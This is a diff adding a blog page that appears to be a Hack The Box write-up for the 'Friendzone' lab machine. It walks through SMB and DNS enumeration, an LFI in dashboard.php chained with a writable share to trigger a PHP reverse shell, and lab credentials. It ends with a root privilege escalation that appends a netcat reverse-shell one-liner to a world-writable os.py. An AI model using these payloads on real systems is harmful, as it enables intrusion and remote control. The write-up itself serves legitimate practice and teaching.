@@ -1,0 +1,912 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Friendzone - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Friendzone is an easy box with some light enumeration of open SMB shares and sub-domains. I used an LFI vulnerability combined with a writable SMB share to get RCE and a reverse shell. A cron job running as root executes a python script every few minutes and the OS module imported by the script is writable so I can modify it and add code to get a shell as root.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Friendzone - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-friendzone/">
+
+
+  <meta property="og:description" content="Friendzone is an easy box with some light enumeration of open SMB shares and sub-domains. I used an LFI vulnerability combined with a writable SMB share to get RCE and a reverse shell. A cron job running as root executes a python script every few minutes and the OS module imported by the script is writable so I can modify it and add code to get a shell as root.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-friendzone/friendzone_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-07-13T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-friendzone/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Friendzone - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Friendzone - Hack The Box">
+    <meta itemprop="description" content="Friendzone is an easy box with some light enumeration of open SMB shares and sub-domains. I used an LFI vulnerability combined with a writable SMB share to get RCE and a reverse shell. A cron job running as root executes a python script every few minutes and the OS module imported by the script is writable so I can modify it and add code to get a shell as root.">
+    <meta itemprop="datePublished" content="July 13, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Friendzone - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-07-13T00:00:00+02:00">July 13, 2019 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-friendzone/friendzone_logo.png" alt=""></p>
+
+<p>Friendzone is an easy box with some light enumeration of open SMB shares and sub-domains. I used an LFI vulnerability combined with a writable SMB share to get RCE and a reverse shell. A cron job running as root executes a python script every few minutes and the OS module imported by the script is writable so I can modify it and add code to get a shell as root.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>A SMB share I access to contains credentials</li>
+  <li>I can do a zone transfer and find a bunch of sub-domains</li>
+  <li>The dashboard page contains an LFI which I can use in combination with the writable SMB share to get RCE</li>
+  <li>After getting a shell as <code class="language-plaintext highlighter-rouge">www-data</code>, I find plaintext credentials that I use to log in as user <code class="language-plaintext highlighter-rouge">friend</code>
+</li>
+  <li>A python script using <code class="language-plaintext highlighter-rouge">os.py</code> runs as root and <code class="language-plaintext highlighter-rouge">os.py</code> is writable so I can add code to get a reverse shell as root</li>
+</ul>
+
+<h2 id="detailed-steps">Detailed steps</h2>
+
+<h3 id="nmap-scan">Nmap scan</h3>
+
+<p>The box has a got a couple of services running. I take note of the DNS server since this could be used to do a DNS zone transfer and query various records that may contain useful information.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -sC -sV -p- 10.10.10.123
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-09 19:05 EST
+Nmap scan report for friendzone.htb (10.10.10.123)
+Host is up (0.013s latency).
+Not shown: 65528 closed ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
+|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
+|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
+53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
+| dns-nsid: 
+|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Friend Zone Escape software
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+443/tcp open  ssl/http    Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 404 Not Found
+| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
+| Not valid before: 2018-10-05T21:02:30
+|_Not valid after:  2018-11-04T21:02:30
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   http/1.1
+|_  http/1.1
+445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
+Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h3 id="ftp-site">FTP site</h3>
+
+<p>Anonymous access is not allowed on the FTP server:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ftp 10.10.10.123
+Connected to 10.10.10.123.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.123:root): anonymous
+331 Please specify the password.
+Password:
+530 Login incorrect.
+Login failed.
+</code></pre></div></div>
+
+<p>Nothing pops up on Exploit-DB for this version of vsFTPd so I’ll move on.</p>
+
+<h3 id="web-enumeration">Web enumeration</h3>
+
+<p>The site is just a simple page with nothing interactive on it but there is a domain name at the bottom which I’ll investigate further.</p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/friendzone.png" alt=""></p>
+
+<h3 id="smb-shares">SMB shares</h3>
+
+<p>Using <code class="language-plaintext highlighter-rouge">smbmap</code> I can list the shares on the box:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -H 10.10.10.123
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.123...
+[+] IP: 10.10.10.123:445	Name: friendzone.htb                                    
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	print$                                            	NO ACCESS
+	Files                                             	NO ACCESS
+	general                                           	READ ONLY
+	Development                                       	READ, WRITE
+	IPC$                                              	NO ACCESS
+</code></pre></div></div>
+
+<p>I can also find where the shares on the filesystem are mapped with the <code class="language-plaintext highlighter-rouge">smb-enum-shares</code> nmap script:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nmap -p 445 --script=smb-enum-shares 10.10.10.123
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-09 20:52 EST
+Nmap scan report for friendzone.htb (10.10.10.123)
+Host is up (0.0089s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.10.123\Development: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\Development
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\Files: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files /etc/Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\hole
+|     Anonymous access: &lt;none&gt;
+|     Current user access: &lt;none&gt;
+|   \\10.10.10.123\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\general: 
+|     Type: STYPE_DISKTREE
+|     Comment: FriendZone Samba Server Files
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\etc\general
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.10.123\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: &lt;none&gt;
+
+Nmap done: 1 IP address (1 host up) scanned in 2.82 seconds
+</code></pre></div></div>
+
+<p>Listing files from the share:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -H 10.10.10.123 -r
+[+] Finding open SMB ports....
+[+] Guest SMB session established on 10.10.10.123...
+[+] IP: 10.10.10.123:445	Name: friendzone.htb                                    
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	print$                                            	NO ACCESS
+	Files                                             	NO ACCESS
+	general                                           	READ ONLY
+	./                                                 
+	dr--r--r--                0 Wed Jan 16 15:10:51 2019	.
+	dr--r--r--                0 Wed Jan 23 16:51:02 2019	..
+	fr--r--r--               57 Tue Oct  9 19:52:42 2018	creds.txt
+	Development                                       	READ, WRITE
+	./                                                 
+	dr--r--r--                0 Sat Feb  9 15:50:02 2019	.
+	dr--r--r--                0 Wed Jan 23 16:51:02 2019	..
+	IPC$                                              	NO ACCESS
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">creds.txt</code> looks interesting:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbclient -U "" //10.10.10.123/general
+
+Enter HTB\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; get creds.txt
+getting file \creds.txt of size 57 as creds.txt (1.6 KiloBytes/sec) (average 1.6 KiloBytes/sec)
+smb: \&gt; exit
+root@ragingunicorn:~/htb/friendzone# cat creds.txt
+creds for the admin THING:
+
+admin:WORKWORKHhallelujah@#
+</code></pre></div></div>
+
+<p>Found some credentials: <code class="language-plaintext highlighter-rouge">admin</code> / <code class="language-plaintext highlighter-rouge">WORKWORKHhallelujah@#</code></p>
+
+<h3 id="sub-domains-enumeration">Sub-domains enumeration</h3>
+
+<p>Now that I have credentials, I just need to find where to use them.</p>
+
+<p>I can do a zone transfer for that domain I saw earlier on the main page and get the list of all sub-domains:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># host -t axfr friendzone.red 10.10.10.123
+Trying "friendzone.red"
+Using domain server:
+Name: 10.10.10.123
+Address: 10.10.10.123#53
+Aliases: 
+
+;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 56850
+;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;friendzone.red.			IN	AXFR
+
+;; ANSWER SECTION:
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+friendzone.red.		604800	IN	AAAA	::1
+friendzone.red.		604800	IN	NS	localhost.
+friendzone.red.		604800	IN	A	127.0.0.1
+administrator1.friendzone.red. 604800 IN A	127.0.0.1
+hr.friendzone.red.	604800	IN	A	127.0.0.1
+uploads.friendzone.red.	604800	IN	A	127.0.0.1
+friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
+
+Received 250 bytes from 10.10.10.123#53 in 12 ms
+</code></pre></div></div>
+
+<p>I’ll add those entries to my local <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p>
+
+<h3 id="upload-page">Upload page</h3>
+
+<p>There’s a php application to upload images at <code class="language-plaintext highlighter-rouge">https://uploads.friendzone.red</code>.</p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/upload.png" alt=""></p>
+
+<p>Whenever I upload a file (image or not), I get a successful message:</p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/upload_successful.png" alt=""></p>
+
+<h3 id="administrator-page">Administrator page</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">https://administrator1.friendzone.red</code> page contains a login form on which I can use the credentials I found in the SMB share.</p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/admin_login.png" alt=""></p>
+
+<p>After logging in I am asked to go to <code class="language-plaintext highlighter-rouge">dashboard.php</code>.</p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/admin_login_successful.png" alt=""></p>
+
+<p>The dashboard page seems to be some application that deals with images, but it’s not really clear what it does except take an image name as a parameter and a pagename.</p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/dashboard.png" alt=""></p>
+
+<p>If I try the parameters displayed on the page I get:</p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/dashboard_params.png" alt=""></p>
+
+<p>The image is linked to <code class="language-plaintext highlighter-rouge">/images</code>, but none of the files I tried to upload from the previous upload page are found in that directory.</p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/images.png" alt=""></p>
+
+<p>There’s an LFI in the <code class="language-plaintext highlighter-rouge">pagename</code> parameter and I can use a PHP base64 encode filter to read files:</p>
+
+<p>Request: <code class="language-plaintext highlighter-rouge">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=pagename=php://filter/convert.base64-encode/resource=dashboard</code></p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/dashboard_lfi.png" alt=""></p>
+
+<p>The base64 encoded text is the source code for <code class="language-plaintext highlighter-rouge">dashboard.php</code>:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="c1">//echo "&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;";</span>
+<span class="c1">//echo "&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;";</span>
+<span class="k">echo</span> <span class="s2">"&lt;title&gt;FriendZone Admin !&lt;/title&gt;"</span><span class="p">;</span>
+<span class="nv">$auth</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"FriendZoneAuth"</span><span class="p">];</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">===</span> <span class="s2">"e7749d0f4b4da5d03e6e9196fd1d18f1"</span><span class="p">){</span>
+ <span class="k">echo</span> <span class="s2">"&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
+
+<span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;h2&gt;Smart photo script for friendzone corp !&lt;/h2&gt;&lt;/center&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;h3&gt;* Note : we are dealing with a beginner php developer and the application is not tested yet !&lt;/h3&gt;&lt;/center&gt;"</span><span class="p">;</span>
+
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"image_id"</span><span class="p">])){</span>
+  <span class="k">echo</span> <span class="s2">"&lt;br&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;image_name param is missed !&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;please enter it to show the image&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
+  <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;default is image_id=a.jpg&amp;pagename=timestamp&lt;/p&gt;&lt;/center&gt;"</span><span class="p">;</span>
+ <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+ <span class="nv">$image</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"image_id"</span><span class="p">];</span>
+ <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;img src='images/</span><span class="nv">$image</span><span class="s2">'&gt;&lt;/center&gt;"</span><span class="p">;</span>
+
+ <span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;h1&gt;Something went worng ! , the script include wrong param !&lt;/h1&gt;&lt;/center&gt;"</span><span class="p">;</span>
+ <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"pagename"</span><span class="p">]</span><span class="mf">.</span><span class="s2">".php"</span><span class="p">);</span>
+ <span class="c1">//echo $_GET["pagename"];</span>
+ <span class="p">}</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+<span class="k">echo</span> <span class="s2">"&lt;center&gt;&lt;p&gt;You can't see the content ! , please login !&lt;/center&gt;&lt;/p&gt;"</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">.php</code> suffix is added automatically after the filename so I can’t arbitrarily read any files. I tried the PHP path truncation technique as well as adding null bytes at the end of string but I was not able to bypass this.</p>
+
+<p>I also dumped the <code class="language-plaintext highlighter-rouge">upload.php</code> source code and saw that the upload thing is just a troll since it doesn’t do anything.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="c1">// not finished yet -- friendzone admin !</span>
+
+<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"image"</span><span class="p">])){</span>
+
+<span class="k">echo</span> <span class="s2">"Uploaded successfully !&lt;br&gt;"</span><span class="p">;</span>
+<span class="k">echo</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">;</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+
+<span class="k">echo</span> <span class="s2">"WHAT ARE YOU TRYING TO DO HOOOOOOMAN !"</span><span class="p">;</span>
+
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h3 id="getting-a-shell-with-php">Getting a shell with PHP</h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">Development</code> share I saw earlier is writable by the guest user so I can upload a PHP reverse shell in there and use the LFI to trigger it. The full path of the share is <code class="language-plaintext highlighter-rouge">/etc/Development</code> as indicated in the nmap script output.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbclient -U "" //10.10.10.123/Development
+Enter HTB\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; put shell.php
+putting file shell.php as \shell.php (184.9 kb/s) (average 184.9 kb/s)
+smb: \&gt; 
+</code></pre></div></div>
+
+<p>I trigger the shell with the following request: <code class="language-plaintext highlighter-rouge">https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&amp;pagename=/etc/Development/shell</code></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.123] 36974
+Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 23:16:59 up 35 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@FriendZone:/$
+</code></pre></div></div>
+
+<p>Found other credentials in the <code class="language-plaintext highlighter-rouge">/var/www</code> directory:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@FriendZone:/var/www$ ls -la
+ls -la
+total 36
+drwxr-xr-x  8 root root 4096 Oct  6 15:47 .
+drwxr-xr-x 12 root root 4096 Oct  6 02:07 ..
+drwxr-xr-x  3 root root 4096 Jan 16 22:13 admin
+drwxr-xr-x  4 root root 4096 Oct  6 01:47 friendzone
+drwxr-xr-x  2 root root 4096 Oct  6 01:56 friendzoneportal
+drwxr-xr-x  2 root root 4096 Jan 15 21:08 friendzoneportaladmin
+drwxr-xr-x  3 root root 4096 Oct  6 02:05 html
+-rw-r--r--  1 root root  116 Oct  6 15:47 mysql_data.conf
+drwxr-xr-x  3 root root 4096 Oct  6 01:39 uploads
+www-data@FriendZone:/var/www$ cat mysql_data.conf
+cat mysql_data.conf
+for development process this is the mysql creds for user friend
+
+db_user=friend
+
+db_pass=Agpyu12!0.213$
+
+db_name=FZ
+</code></pre></div></div>
+
+<p>There’s a <code class="language-plaintext highlighter-rouge">friend</code> user in the local passwd database:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@FriendZone:/var/www$ grep friend /etc/passwd
+grep friend /etc/passwd
+friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
+</code></pre></div></div>
+
+<p>I can SSH in with those credentials and grab the <code class="language-plaintext highlighter-rouge">user.txt</code> flag:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~/htb/friendzone# ssh friend@10.10.10.123
+Ilcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+You have mail.
+Last login: Sat Feb  9 23:43:09 2019 from 10.10.14.23
+friend@FriendZone:~$ cat user.txt
+a9ed20...
+</code></pre></div></div>
+
+<h3 id="privesc">Privesc</h3>
+
+<p><code class="language-plaintext highlighter-rouge">/opt/server_admin</code> contains a <code class="language-plaintext highlighter-rouge">reporter.py</code> script that probably runs every minutes in a root owned cronjob:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt/server_admin$ cat reporter.py 
+#!/usr/bin/python
+
+import os
+
+to_address = "admin1@friendzone.com"
+from_address = "admin2@friendzone.com"
+
+print "[+] Trying to send email to %s"%to_address
+
+#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+#os.system(command)
+
+# I need to edit the script later
+# Sam ~ python developer
+</code></pre></div></div>
+
+<p>I can confirm it’s running in a cronjob by using pspy:</p>
+
+<p><img src="/assets/images/htb-writeup-friendzone/pspy.png" alt=""></p>
+
+<p>The script doesn’t really do anything except import the standard <code class="language-plaintext highlighter-rouge">os</code> module.</p>
+
+<p>Looking at the module definition, I see that the permissions are world writable on the one for Python 2.7:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>friend@FriendZone:/opt/server_admin$ find /usr -name os.py 2&gt;/dev/null
+/usr/lib/python3.6/os.py
+/usr/lib/python2.7/os.py
+friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py
+-rwxrwxrwx 1 root root 25910 Jan 15 22:19 /usr/lib/python2.7/os.py
+friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python3.6/os.py
+-rw-r--r-- 1 root root 37526 Sep 12 21:26 /usr/lib/python3.6/os.py
+</code></pre></div></div>
+
+<p>I can modify the <code class="language-plaintext highlighter-rouge">os.py</code> file and add a reverse shell at the end so when the module is imported by the script it’ll execute my reverse shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 5555 &gt;/tmp/f")
+</code></pre></div></div>
+
+<p>A few moments later I get a shell as root:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [10.10.14.23] from (UNKNOWN) [10.10.10.123] 60168
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+b0e6c6...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#axfr" class="page__taxonomy-item" rel="tag">axfr</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cronjob" class="page__taxonomy-item" rel="tag">cronjob</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#dns" class="page__taxonomy-item" rel="tag">dns</a><span class="sep">, </span>
+    
+      
+      
